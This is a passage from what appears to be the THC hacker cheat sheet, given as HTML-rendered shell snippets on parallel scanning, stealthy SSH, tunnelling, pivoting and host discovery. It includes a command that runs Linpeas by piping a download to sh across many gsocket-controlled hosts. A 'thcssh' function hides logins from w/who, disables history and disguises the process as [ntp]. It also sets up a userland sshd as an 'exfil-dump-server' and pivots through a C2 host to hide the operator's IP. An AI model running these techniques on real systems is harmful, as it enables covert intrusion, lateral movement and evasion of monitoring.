<strong>1.ix. Execute in parallel with separate logfiles</strong>*</p>
<p>Scan 20 hosts in parallel and log each result to a separate log file:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># hosts.txt contains a long list of hostnames or ip-addresses</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>cat<span class="w"> </span>hosts.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>parallel<span class="w"> </span>-j20<span class="w"> </span><span class="s1">&#39;exec nmap -n -Pn -sCV -F --open {} &gt;nmap_{}.txt&#39;</span>
</span></code></pre></div>
Note: The example uses <code>exec</code> to replace the underlying shell with the last process (nmap, gsexec). It's optional but reduces the number of running shell binaries.</p>
<p>Execute <a href="https://github.com/carlospolop/PEASS-ng">Linpeas</a> on all <a href="https://www.gsocket.io/deploy">gsocket</a> hosts using 40 workers:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># secrets.txt contains a long list of gsocket-secrets for each remote server.</span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>cat<span class="w"> </span>secrets.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>parallel<span class="w"> </span>-j40<span class="w"> </span><span class="s1">&#39;mkdir host_{}; exec gsexec {} &quot;curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh&quot; &gt;host_{}/linpeas.log 2&gt;host_{}/linpeas.err&#39;</span>
</span></code></pre></div>
Note: <code>xargs -P20 -I{}</code> is another good way but it cannot log each output into a separate file.  </p>
<hr />
<p><a id="ssh"></a></p>
<h2 id="2-ssh">2. SSH</h2>
<p><a id="ssh-invisible"></a>
<strong>2.i. Almost invisible SSH</strong></p>
<p>Stops you from showing up in <em>w</em> or <em>who</em> command and stops logging the host to <em>~/.ssh/known_hosts</em>.
<div class="language-sh highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">UserKnownHostsFile</span><span class="o">=</span>/dev/null<span class="w"> </span>-T<span class="w"> </span>user@server.org<span class="w"> </span><span class="s2">&quot;bash -i&quot;</span>
</span></code></pre></div></p>
<p>Go full comfort with PTY and colors: <code>thcssh user@server.org</code>:</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1">### Cut &amp; Paste the following to your shell, then execute</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="c1">### thcssh user@server.org</span>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>thcssh<span class="o">()</span>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="o">{</span>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="w">    </span><span class="nb">local</span><span class="w"> </span>ttyp
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\e[0;35mTHC says: pimp up your prompt: Cut &amp; Paste the following into your remote shell:\e[0;36m&quot;</span>
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;PS1=&#39;&quot;</span><span class="s1">&#39;\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ &#39;</span><span class="s2">&quot;&#39;\e[0m&quot;</span>
</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="w">    </span><span class="nv">ttyp</span><span class="o">=</span><span class="k">$(</span>stty<span class="w"> </span>-g<span class="k">)</span>
</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="w">    </span>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="w"> </span>opost
</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="w">    </span><span class="o">[[</span><span class="w"> </span><span class="k">$(</span>ssh<span class="w"> </span>-V<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="k">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>OpenSSH_<span class="o">[</span><span class="m">67</span><span class="o">]</span>*<span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nv">a</span><span class="o">=</span><span class="s2">&quot;no&quot;</span>
</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="w">    </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">UpdateHostKeys</span><span class="o">=</span>no<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">a</span><span class="k">:-</span><span class="nv">accept</span><span class="p">-new</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>-T<span class="w"> </span><span class="se">\</span>
</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="w">        </span><span class="s2">&quot;</span><span class="nv">$@</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a><span class="w">        </span><span class="s2">&quot;unset SSH_CLIENT SSH_CONNECTION; TERM=xterm-256color BASH_HISTORY=/dev/null exec -a [ntp] script -qc &#39;exec -a [uid] /bin/bash -i&#39; /dev/null&quot;</span>
</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="w">    </span>stty<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">ttyp</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a><span class="o">}</span>
</span></code></pre></div>
<p><a id="ssh-master"></a>
<strong>2.ii Multiple shells via 1 SSH/TCP connection</strong></p>
<p>Have one TCP connection to the target and allow multiple users to piggyback on the same TCP connection to open further shell sessions.</p>
<p>Create a Master Connection:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>ssh<span class="w"> </span>-M<span class="w"> </span>-S<span class="w"> </span>.sshmux<span class="w"> </span>user@server.org
</span></code></pre></div></p>
<p>Create further shell-sessions using the same (single) Master-TCP connection from above (no password/auth needed):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>ssh<span class="w"> </span>-S<span class="w"> </span>.sshmux<span class="w"> </span>NONE
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="c1">#ssh -S .sshmux NONE ls -al</span>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="c1">#scp -o &quot;ControlPath=.sshmux&quot; NONE:/etc/passwd .</span>
</span></code></pre></div>
Can be combined with <a href="#ssh-invisible">thcssh</a> to hide from utmp.</p>
<p><a id="ssh-tunnel"></a>
<strong>2.iii SSH tunnel</strong></p>
<p>We use this all the time to circumvent local firewalls and IP filtering:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>ssh<span class="w"> </span>-g<span class="w"> </span>-L31337:1.2.3.4:80<span class="w"> </span>user@server.org
</span></code></pre></div>
You or anyone else can now connect to your computer on port 31337 and get tunneled to 1.2.3.4 port 80 and appear with the source IP of 'server.org'. An alternative and without the need for a server is to use <a href="#backdoor-network">gs-netcat</a>.</p>
<p>Clever hackers use the keyboard combination <code>~C</code> to dynamically create these tunnels without having to reconnect the SSH. (thanks MessedeDegod).</p>
<p>We use this to give access to a friend to an internal machine that is not on the public Internet:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">ExitOnForwardFailure</span><span class="o">=</span>yes<span class="w"> </span>-g<span class="w"> </span>-R31338:192.168.0.5:80<span class="w"> </span>user@server.org
</span></code></pre></div>
Anyone connecting to server.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer. An alternative and without the need for a server is to use <a href="#backdoor-network">gs-netcat</a>.</p>
<p><a id="ssh-socks-tunnel"></a>
<strong>2.iv SSH socks4/5 tunnel</strong></p>
<p>OpenSSH 7.6 adds socks support for dynamic forwarding. Example: Tunnel all your browser traffic through your server.</p>
<p><div class="language-sh highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">1080</span><span class="w"> </span>user@server.org
</span></code></pre></div>
Now configure your browser to use SOCKS with 127.0.0.1:1080. All your traffic is now tunneled through <em>server.org</em> and will appear with the source IP of <em>server.org</em>. An alternative and without the need for a server is to use <a href="#backdoor-network">gs-netcat</a>.</p>
<p>This is the reverse of the above example. It give others access to your <em>local</em> network or let others use your computer as a tunnel end-point.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>ssh<span class="w"> </span>-g<span class="w"> </span>-R<span class="w"> </span><span class="m">1080</span><span class="w"> </span>user@server.org
</span></code></pre></div>
<p>The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to <em>any</em> computer on <em>any port</em> that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use <a href="#backdoor-network">gs-netcat</a>.</p>
<p><a id="ssh-j"></a>
<strong>2.v SSH to a host behind NAT</strong></p>
<p><a href="http://ssh-j.com">ssh-j.com</a> provides a great relay service: To access a host behind NAT/Firewall (via SSH).</p>
<p>On the host behind NAT: Create a reverse SSH tunnel to <a href="http://ssh-j.com">ssh-j.com</a> like so:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c1">## Cut &amp; Paste on the host behind NAT.</span>
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>sshj<span class="o">()</span>
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="o">{</span>
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="w">   </span><span class="nb">local</span><span class="w"> </span>pw
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="w">   </span><span class="nv">pw</span><span class="o">=</span><span class="si">${</span><span class="nv">1</span><span class="p">,,</span><span class="si">}</span>
</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="w">   </span><span class="o">[[</span><span class="w"> </span>-z<span class="w"> </span><span class="nv">$pw</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="nv">pw</span><span class="o">=</span><span class="k">$(</span>head<span class="w"> </span>-c64<span class="w"> </span>&lt;/dev/urandom<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span>-d<span class="w"> </span>-c<span class="w"> </span>a-z0-9<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="nv">pw</span><span class="o">=</span><span class="si">${</span><span class="nv">pw</span><span class="p">:</span><span class="nv">0</span><span class="p">:</span><span class="nv">12</span><span class="si">}</span><span class="p">;</span><span class="w"> </span><span class="o">}</span>
</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="w">   </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Press Ctrl-C to stop this tunnel.&quot;</span>
</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="w">   </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;To ssh to </span><span class="si">${</span><span class="nv">USER</span><span class="k">:-</span><span class="nv">root</span><span class="si">}</span><span class="s2">@</span><span class="si">${</span><span class="nv">2</span><span class="k">:-</span><span class="nv">127</span><span class="p">.0.0.1</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">3</span><span class="k">:-</span><span class="nv">22</span><span class="si">}</span><span class="s2"> type: \e[0;36mssh -J </span><span class="si">${</span><span class="nv">pw</span><span class="si">}</span><span class="s2">@ssh-j.com </span><span class="si">${</span><span class="nv">USER</span><span class="k">:-</span><span class="nv">root</span><span class="si">}</span><span class="s2">@</span><span class="si">${</span><span class="nv">pw</span><span class="si">}</span><span class="s2">\e[0m&quot;</span>
</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="w">   </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>accept-new<span class="w"> </span>-o<span class="w"> </span><span class="nv">ServerAliveInterval</span><span class="o">=</span><span class="m">30</span><span class="w"> </span>-o<span class="w"> </span><span class="nv">ExitOnForwardFailure</span><span class="o">=</span>yes<span class="w"> </span><span class="si">${</span><span class="nv">pw</span><span class="si">}</span>@ssh-j.com<span class="w"> </span>-N<span class="w"> </span>-R<span class="w"> </span><span class="si">${</span><span class="nv">pw</span><span class="si">}</span>:22:<span class="si">${</span><span class="nv">2</span><span class="k">:-</span><span class="nv">0</span><span class="si">}</span>:<span class="si">${</span><span class="nv">3</span><span class="k">:-</span><span class="nv">22</span><span class="si">}</span>
</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="o">}</span>
</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>
</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>sshj<span class="w">                                 </span><span class="c1"># Generates a random tunnel ID [e.g. 5dmxf27tl4kx] and keeps the tunnel connected</span>
</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a>sshj<span class="w"> </span>foobarblahblub<span class="w">                  </span><span class="c1"># Creates tunnel to 127.0.0.1:22 with specific tunnel ID</span>
</span><span id="__span-28-14"><a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a>sshj<span class="w"> </span>foobarblahblub<span class="w"> </span><span class="m">192</span>.168.0.1<span class="w"> </span><span class="m">2222</span><span class="w"> </span><span class="c1"># Tunnel to host 192.168.0.1:2222 on the LAN</span>
</span></code></pre></div></p>
<p>Then use this command from anywhere else in the world to connect as 'root' to 'foobarblahblub' (the host behind the NAT):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>ssh<span class="w"> </span>-J<span class="w"> </span>foobarblahblub@ssh-j.com<span class="w"> </span>root@foobarblahblub
</span></code></pre></div>
The ssh connection goes via ssh-j.com into the reverse tunnel to the host behind NAT. The traffic is end-2-end encrypted and ssh-j.com can not see the content.</p>
<p><a id="ssh-pj"></a>
<strong>2.vi SSH pivoting to multiple servers</strong></p>
<p>SSH ProxyJump can save you a lot of time and hassle when working with remote servers. Let's assume the scenario:  </p>
<p>Our workstation is $local-kali and we like to SSH into $target-host. There is no direct connection between our workstation and $target-host. Our workstation can only reach $C2. $C2 can reach $internal-jumphost (via internal eth1) and $internal-jumphost can reach the final $target-host via eth2.
<div class="language-sh highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="w">          </span><span class="nv">$local</span>-kali<span class="w">       </span>-&gt;<span class="w"> </span><span class="nv">$C2</span><span class="w">            </span>-&gt;<span class="w"> </span><span class="nv">$internal</span>-jumphost<span class="w">    </span>-&gt;<span class="w"> </span><span class="nv">$target</span>-host
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>eth0<span class="w">      </span><span class="m">192</span>.168.8.160<span class="w">      </span><span class="m">10</span>.25.237.119<span class="w">             </span>
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>eth1<span class="w">                         </span><span class="m">192</span>.168.5.130<span class="w">       </span><span class="m">192</span>.168.5.135
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>eth2<span class="w">                                             </span><span class="m">172</span>.16.2.120<span class="w">             </span><span class="m">172</span>.16.2.121
</span></code></pre></div></p>
<blockquote>
<p>We do not execute <code>ssh</code> on any computer but our trusted workstation - and neither shall you (ever).</p>
</blockquote>
<p>That's where ProxyJump helps: We can 'jump' via the two intermediary servers $C2 and $internal-jumphost (without spawning a shell on those servers). The ssh-connection is end-2-end encrypted between our $local-kali and $target-host and no password or key is exposed to $C2 or $internal-jumphost.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="c1">## if we want to SSH to $target-host:</span>
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>kali@local-kali$<span class="w"> </span>ssh<span class="w"> </span>-J<span class="w"> </span>c2@10.25.237.119,jumpuser@192.168.5.135<span class="w"> </span>target@172.16.2.121
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="c1">## if we want to SSH to just $internal-jumphost:</span>
</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>kali@local-kali$<span class="w"> </span>ssh<span class="w"> </span>-J<span class="w"> </span>c2@10.25.237.119<span class="w"> </span>jumpuser@192.168.5.135
</span></code></pre></div>
<blockquote>
<p>We use this as well to hide our IP address when logging into servers. </p>
</blockquote>
<p><a id="sshd-user"></a>
<strong>2.vii SSHD as user land</strong></p>
<p>It is possible to start a SSHD server as a non-root user and use this to multiplex or forward TCP connection (without logging and when the systemwide SSHD forbids forwarding/multiplexing) or as a quick exfil-dump-server that runs as non-root:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c1"># On the server, as non-root user &#39;joe&#39;:</span>
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>~/.ssh<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>ssh-keygen<span class="w"> </span>-q<span class="w"> </span>-N<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-t<span class="w"> </span>ed25519<span class="w"> </span>-f<span class="w"> </span>sshd_key
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>cat<span class="w"> </span>sshd_key.pub<span class="w"> </span>&gt;&gt;~/.ssh/authorized_keys
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>cat<span class="w"> </span>sshd_key
</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="k">$(</span><span class="nb">command</span><span class="w"> </span>-v<span class="w"> </span>sshd<span class="k">)</span><span class="w"> </span>-f<span class="w"> </span>/dev/null<span class="w"> </span>-o<span class="w"> </span><span class="nv">HostKey</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/sshd_key<span class="w"> </span>-o<span class="w"> </span><span class="nv">GatewayPorts</span><span class="o">=</span>yes<span class="w"> </span>-p<span class="w"> </span><span class="m">31337</span><span class="w"> </span><span class="c1"># -Dvvv</span>
</span></code></pre></div>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1"># On the client, copy the sshd_key from the server. Then login:</span>
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="c1"># Example: Proxy connection via the server and reverse-forward 31339 to localhost:</span>
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>ssh<span class="w"> </span>-D1080<span class="w"> </span>-R31339:0:31339<span class="w"> </span>-i<span class="w"> </span>sshd_key<span class="w"> </span>-p<span class="w"> </span><span class="m">31337</span><span class="w"> </span>joe@1.2.3.4
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="c1"># curl -x socks5h://0 ipinfo.io</span>
</span></code></pre></div></p>
<p><a href="https://securesocketfunneling.github.io/ssf/#home">SSF</a> is an alternative way to multiplex TCP over TLS.</p>
<hr />
<p><a id="network"></a></p>
<h2 id="3-network">3. Network</h2>
<p><a id="discover"></a>
<strong>3.i. Discover hosts</strong></p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1">## ARP disocer computers on the local network</span>
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>nmap<span class="w"> </span>-r<span class="w"> </span>-sn<span class="w"> </span>-PR<span class="w"> </span><span class="m">192</span>.168.0.1/24
</span></code></pre></div>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1">## ICMP discover computers on the local netowrk</span>
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="nv">NET</span><span class="o">=</span><span class="s2">&quot;10.11.0&quot;</span><span class="w">  </span><span class="c1"># discover 10.11.0.1-10.11.0.254</span>
</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">254</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span>-P20<span class="w"> </span>-I<span class="o">{}</span><span class="w"> </span>ping<span class="w"> </span>-n<span class="w"> </span>-c3<span class="w"> </span>-i0.2<span class="w"> </span>-w1<span class="w"> </span>-W200<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">NET</span><span class="k">:-</span><span class="nv">192</span><span class="p">.168.0</span><span class="si">}</span><span class="s2">.{}&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;bytes from&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $4&quot; &quot;$7;}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-uV<span class="w"> </span>-k1,1
</span></code></pre></div>
<hr />
<p><a id="tcpdump"></a>
<strong>3.ii. tcpdump</strong></p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c1">## Monitor every new TCP connection</span>
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>tcpdump<span class="w"> </span>-np<span class="w"> </span><span class="s2">&quot;tcp[tcpflags] == tcp-syn&quot;</span>
</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>
</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="c1">## Play a *bing*-noise for every new SSH connection</span>
</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>tcpdump<span class="w"> </span>-nplq<span class="w"> </span><span class="s2">&quot;tcp[13] == 2 and dst port 22&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>x<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-en<span class="w"> </span><span class="se">\\</span>a<span class="p">;</span><span class="w"> </span><span class="k">done</span>
</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>
</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="c1">## Ascii output (for all large packets. Change to &gt;40 if no TCP options are used).</span>
</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>tcpdump<span class="w"> </span>-npAq<span class="w"> </span>-s0<span class="w"> </span><span class="s1">&#39;tcp and (ip[2:2] &gt; 60)&#39;</span>
</span></code></pre></div>
<hr />
<p><a id="tunnel"></a>
<strong>3.iii. Tunnel and forwarding</strong></p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c1">## Connect to SSL (using socat)</span>
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>socat<span class="w"> </span>stdio<span class="w"> </span>openssl-connect:smtp.gmail.com:465
</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>
</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="c1">## Connect to SSL (using openssl)</span>
</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>openssl<span class="w"> </span>s_client<span class="w"> </span>-connect<span class="w"> </span>smtp.gmail.com:465
</span></code></pre></div>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c1">## Bridge TCP to SSL</span>
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>socat<span class="w"> </span>TCP-LISTEN:25,reuseaddr,fork<span class="w">  </span>openssl-connect:smtp.gmail.com:465
</span></code></pre></div>
<hr />
<p><a id="ports"></a>
<strong>3.iii.a Raw TCP reverse ports</strong></p>
<p>Using <a href="https://thc.org/segfault.net">segfault.net</a> (free):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c1"># Request a random public TCP port:</span>
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>curl<span class="w"> </span>sf/port
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Your public IP:PORT is </span><span class="k">$(</span>cat<span class="w"> </span>/config/self/reverse_ip<span class="k">)</span><span class="s2">:</span><span class="k">$(</span>cat<span class="w"> </span>/config/self/reverse_port<span class="k">)</span><span class="s2">&quot;</span>
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>nc<span class="w"> </span>-vnlp<span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>/config/self/reverse_port<span class="k">)</span>
</span></code></pre></div></p>
<p>Using <a href="https://github.com/ekzhang/bore">bore.pub</a> (free):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># Forward a random public TCP port to localhost:31337</span>
